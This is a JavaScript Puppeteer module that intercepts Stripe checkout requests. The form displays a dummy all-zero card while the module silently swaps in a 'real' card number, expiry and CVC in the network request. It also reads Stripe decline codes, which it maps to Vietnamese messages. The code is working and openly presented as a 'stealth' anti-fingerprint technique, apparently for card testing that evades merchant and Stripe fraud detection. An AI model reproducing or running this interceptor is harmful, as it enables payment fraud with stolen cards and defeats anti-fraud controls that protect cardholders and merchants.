/**
 * Stripe Request Interceptor Module
 * Anti-fingerprint technique: Display fake card on form, send real card via network
 * Like Propaganda Extension
 */

// Fake card data to display on form (same as Propaganda)
const FAKE_CARD = {
    number: '0000000000000000',
    expMonth: '12',
    expYear: '30',
    cvc: '000'
};

// Stripe API endpoints to intercept
const STRIPE_ENDPOINTS = [
    'api.stripe.com/v1/payment_methods',
    'api.stripe.com/v1/tokens',
    'api.stripe.com/v1/payment_intents',
    'api.stripe.com/v1/setup_intents',
    'api.stripe.com/v1/sources',
    'checkout.stripe.com/api',
    'r.stripe.com'
];

// Decline code mappings for user-friendly messages
const DECLINE_CODES = {
    'card_declined': 'Thẻ bị từ chối',
    'insufficient_funds': 'Thẻ không đủ tiền',
    'lost_card': 'Thẻ bị mất',
    'stolen_card': 'Thẻ bị đánh cắp',
    'expired_card': 'Thẻ hết hạn',
    'incorrect_cvc': 'CVC sai',
    'incorrect_number': 'Số thẻ sai',
    'incorrect_zip': 'ZIP code sai',
    'processing_error': 'Lỗi xử lý',
    'invalid_account': 'Tài khoản không hợp lệ',
    'invalid_amount': 'Số tiền không hợp lệ',
    'card_not_supported': 'Loại thẻ không được hỗ trợ',
    'currency_not_supported': 'Tiền tệ không được hỗ trợ',
    'duplicate_transaction': 'Giao dịch trùng lặp',
    'fraudulent': 'Nghi ngờ gian lận',
    'generic_decline': 'Bị từ chối (chung)',
    'authentication_required': 'Cần xác thực 3D Secure',
    'do_not_honor': 'Ngân hành từ chối',
    'do_not_try_again': 'Không thử lại',
    'issuer_not_available': 'Ngân hàng không khả dụng',
    'new_account_information_available': 'Thông tin thẻ mới',
    'no_action_taken': 'Không xử lý',
    'not_permitted': 'Không được phép',
    'offline_pin_required': 'Cần PIN offline',
    'online_or_offline_pin_required': 'Cần PIN',
    'pickup_card': 'Thu hồi thẻ',
    'pin_try_exceeded': 'Quá số lần nhập PIN',
    'reenter_transaction': 'Nhập lại giao dịch',
    'restricted_card': 'Thẻ bị hạn chế',
    'revocation_of_all_authorizations': 'Thu hồi ủy quyền',
    'revocation_of_authorization': 'Thu hồi ủy quyền',
    'security_violation': 'Vi phạm bảo mật',
    'service_not_allowed': 'Dịch vụ không được phép',
    'stop_payment_order': 'Lệnh dừng thanh toán',
    'testmode_decline': 'Từ chối (test mode)',
    'transaction_not_allowed': 'Giao dịch không được phép',
    'try_again_later': 'Thử lại sau',
    'withdrawal_count_limit_exceeded': 'Vượt giới hạn rút tiền'
};

class StripeInterceptor {
    constructor(logCallback = console.log) {
        this.log = logCallback;
        this.realCard = null;
        this.interceptedRequests = 0;
        this.lastDeclineReason = null;
    }

    /**
     * Get the fake card data to display on form
     */
    getFakeCard() {
        return FAKE_CARD;
    }

    /**
     * Set the real card data to use in intercepted requests
     */
    setRealCard(card) {
        this.realCard = {
            number: card.number.replace(/\s/g, ''),
            expMonth: card.month.padStart(2, '0'),
            expYear: card.year.length === 2 ? card.year : card.year.slice(-2),
            cvc: card.cvc
        };
        this.log(`🎭 Stealth: Real card set ****${this.realCard.number.slice(-4)}`, 'stealth');
    }

    /**
     * Check if URL is a Stripe API endpoint
     */
    isStripeEndpoint(url) {
        return STRIPE_ENDPOINTS.some(endpoint => url.includes(endpoint));
    }

    /**
     * Parse and decode URL-encoded body
     */
    parseUrlEncodedBody(body) {
        const params = new URLSearchParams(body);
        const result = {};
        for (const [key, value] of params) {
            result[key] = value;
        }
        return result;
    }

    /**
     * Encode object back to URL-encoded string
     */
    encodeUrlBody(obj) {
        const params = new URLSearchParams();
        for (const [key, value] of Object.entries(obj)) {
            params.append(key, value);
        }
        return params.toString();
    }

    /**
     * Replace fake card data with real card in request body
     */
    modifyRequestBody(body, contentType) {
        if (!this.realCard) {
            this.log('⚠️ No real card set, skipping modification', 'warning');
            return body;
        }

        let modified = body;
        let wasModified = false;

        try {
            // Handle URL-encoded form data
            if (contentType?.includes('application/x-www-form-urlencoded') || 
                (typeof body === 'string' && body.includes('card%5Bnumber%5D'))) {
                
                const decoded = decodeURIComponent(body);
                
                // Replace card number patterns
                const cardPatterns = [
                    // Pattern: card[number]=0000000000000000
                    { regex: /card\[number\]=0{16}/g, replacement: `card[number]=${this.realCard.number}` },
                    // Pattern: payment_method_data[card][number]=0000000000000000
                    { regex: /payment_method_data\[card\]\[number\]=0{16}/g, replacement: `payment_method_data[card][number]=${this.realCard.number}` },
                    // Pattern: source_data[number]=0000000000000000
                    { regex: /source_data\[number\]=0{16}/g, replacement: `source_data[number]=${this.realCard.number}` },
                    
                    // Replace expiry month
                    { regex: /card\[exp_month\]=12/g, replacement: `card[exp_month]=${this.realCard.expMonth}` },
                    { regex: /payment_method_data\[card\]\[exp_month\]=12/g, replacement: `payment_method_data[card][exp_month]=${this.realCard.expMonth}` },
                    { regex: /source_data\[exp_month\]=12/g, replacement: `source_data[exp_month]=${this.realCard.expMonth}` },
                    
                    // Replace expiry year
                    { regex: /card\[exp_year\]=30/g, replacement: `card[exp_year]=${this.realCard.expYear}` },
                    { regex: /card\[exp_year\]=2030/g, replacement: `card[exp_year]=20${this.realCard.expYear}` },
                    { regex: /payment_method_data\[card\]\[exp_year\]=30/g, replacement: `payment_method_data[card][exp_year]=${this.realCard.expYear}` },
                    { regex: /payment_method_data\[card\]\[exp_year\]=2030/g, replacement: `payment_method_data[card][exp_year]=20${this.realCard.expYear}` },
                    { regex: /source_data\[exp_year\]=30/g, replacement: `source_data[exp_year]=${this.realCard.expYear}` },
                    { regex: /source_data\[exp_year\]=2030/g, replacement: `source_data[exp_year]=20${this.realCard.expYear}` },
                    
                    // Replace CVC
                    { regex: /card\[cvc\]=000/g, replacement: `card[cvc]=${this.realCard.cvc}` },
                    { regex: /payment_method_data\[card\]\[cvc\]=000/g, replacement: `payment_method_data[card][cvc]=${this.realCard.cvc}` },
                    { regex: /source_data\[cvc\]=000/g, replacement: `source_data[cvc]=${this.realCard.cvc}` },
                ];

                let modifiedDecoded = decoded;
                for (const pattern of cardPatterns) {
                    if (pattern.regex.test(modifiedDecoded)) {
                        modifiedDecoded = modifiedDecoded.replace(pattern.regex, pattern.replacement);
                        wasModified = true;
                    }
                }

                if (wasModified) {
                    modified = encodeURIComponent(modifiedDecoded).replace(/%3D/g, '=').replace(/%26/g, '&');
                }
            }
            
            // Handle JSON body
            else if (contentType?.includes('application/json') || 
                     (typeof body === 'string' && body.startsWith('{'))) {
                try {
                    const json = JSON.parse(body);
                    
                    // Deep replace in JSON object
                    const replaceInObject = (obj) => {
                        for (const key in obj) {
                            if (typeof obj[key] === 'object' && obj[key] !== null) {
                                replaceInObject(obj[key]);
                            } else if (typeof obj[key] === 'string') {
                                // Replace card number
                                if ((key === 'number' || key === 'card_number') && obj[key] === '0000000000000000') {
                                    obj[key] = this.realCard.number;
                                    wasModified = true;
                                }
                                // Replace expiry month
                                if ((key === 'exp_month' || key === 'expiry_month') && (obj[key] === '12' || obj[key] === 12)) {
                                    obj[key] = this.realCard.expMonth;
                                    wasModified = true;
                                }
                                // Replace expiry year
                                if ((key === 'exp_year' || key === 'expiry_year') && (obj[key] === '30' || obj[key] === '2030' || obj[key] === 30 || obj[key] === 2030)) {
                                    obj[key] = obj[key].toString().length === 4 ? `20${this.realCard.expYear}` : this.realCard.expYear;
                                    wasModified = true;
                                }
                                // Replace CVC
                                if ((key === 'cvc' || key === 'cvv' || key === 'security_code') && obj[key] === '000') {
                                    obj[key] = this.realCard.cvc;
                                    wasModified = true;
                                }
                            }
                        }
                    };
                    
                    replaceInObject(json);
                    if (wasModified) {
                        modified = JSON.stringify(json);
                    }
                } catch (e) {
                    // Not valid JSON, skip
                }
            }

            if (wasModified) {
                this.interceptedRequests++;
                this.log(`🎭 Stealth: Card data replaced in request #${this.interceptedRequests}`, 'stealth');
            }

        } catch (error) {
            this.log(`⚠️ Error modifying request: ${error.message}`, 'warning');
        }

        return modified;
    }

    /**
     * Setup request interception on a Puppeteer page
     */
    async setupInterception(page) {
        await page.setRequestInterception(true);
        
        page.on('request', async (request) => {
            const url = request.url();
            const method = request.method();
            const postData = request.postData();
            const headers = request.headers();

            // Only intercept POST requests to Stripe endpoints
            if (method === 'POST' && this.isStripeEndpoint(url) && postData) {
                const contentType = headers['content-type'] || '';
                const modifiedBody = this.modifyRequestBody(postData, contentType);
                
                if (modifiedBody !== postData) {
                    // Continue with modified body
                    request.continue({
                        postData: modifiedBody
                    });
                    return;
                }
            }
            
            // Let all other requests pass through
            request.continue();
        });

        // Monitor responses for decline detection
        page.on('response', async (response) => {
            const url = response.url();
            
            if (this.isStripeEndpoint(url)) {
                try {
                    const status = response.status();
                    
                    // Only parse error responses
                    if (status >= 400) {
                        const text = await response.text();
                        const declineInfo = this.parseDeclineReason(text);
                        if (declineInfo) {
                            this.lastDeclineReason = declineInfo;
                            this.log(`❌ Decline detected: ${declineInfo.code} - ${declineInfo.message}`, 'error');
                        }
                    }
                } catch (e) {
                    // Ignore response parsing errors
                }
            }
        });

        this.log('🎭 Request interception enabled', 'stealth');
    }

    /**
     * Parse decline reason from Stripe response
     */
    parseDeclineReason(responseBody) {
        try {
            // Try to parse as JSON
            let data;
            try {
                data = JSON.parse(responseBody);
            } catch {
                // Try to extract JSON from response
                const jsonMatch = responseBody.match(/\{[\s\S]*\}/);
                if (jsonMatch) {
                    data = JSON.parse(jsonMatch[0]);
                } else {
                    return null;
                }
            }

            // Extract error info from various Stripe response formats
            const error = data.error || data;
            
            if (error.decline_code || error.code || error.type === 'card_error') {
                const declineCode = error.decline_code || error.code || 'unknown';
                const message = DECLINE_CODES[declineCode] || error.message || declineCode;
                
                return {
                    code: declineCode,
                    message: message,
                    rawMessage: error.message || '',
                    type: error.type || 'card_error'
                };
            }

            // Check for generic error
            if (error.message && (
                error.message.toLowerCase().includes('decline') ||
                error.message.toLowerCase().includes('failed') ||
                error.message.toLowerCase().includes('insufficient')
            )) {
                return {
                    code: 'generic_decline',
                    message: error.message,
                    rawMessage: error.message,
                    type: 'card_error'
                };
            }

        } catch (e) {
            // Ignore parse errors
        }
        
        return null;
    }

    /**
     * Get the last decline reason
     */
    getLastDeclineReason() {
        return this.lastDeclineReason;
    }

    /**
     * Reset state for new card
     */
    reset() {
        this.realCard = null;
        this.lastDeclineReason = null;
    }

    /**
     * Get stats
     */
    getStats() {
        return {
            interceptedRequests: this.interceptedRequests,
            lastDeclineReason: this.lastDeclineReason
        };
    }
}

module.exports = { StripeInterceptor, FAKE_CARD, DECLINE_CODES };
